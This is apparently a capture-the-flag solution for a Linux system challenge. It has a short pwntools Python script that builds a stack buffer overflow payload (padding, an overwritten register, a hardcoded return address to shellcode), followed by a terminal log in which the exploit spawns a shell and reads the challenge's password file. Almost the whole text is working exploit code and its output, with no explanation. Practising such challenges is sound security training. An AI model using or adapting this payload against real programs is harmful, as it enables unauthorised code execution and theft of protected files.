


```python
from pwn import *


padding ="USERNAME="
padding +="A"*136
esi = "\x08\xb0\x04\x08"  #need for fgets
stuff="B"*28
retn =0xffffd8a3        #address of shellcode
ebp ="\x04\xda\xff\xff"   #cp after so we need to redirect somewhere not the return address ->need for res
print padding +esi+stuff +p32(retn)+ebp
```












```
app-systeme-ch10@challenge02:~$ ./ch10 /tmp/ch10/input
sh-4.2$ ls
ch10  ch10.c
sh-4.2$ cat .passwd
```
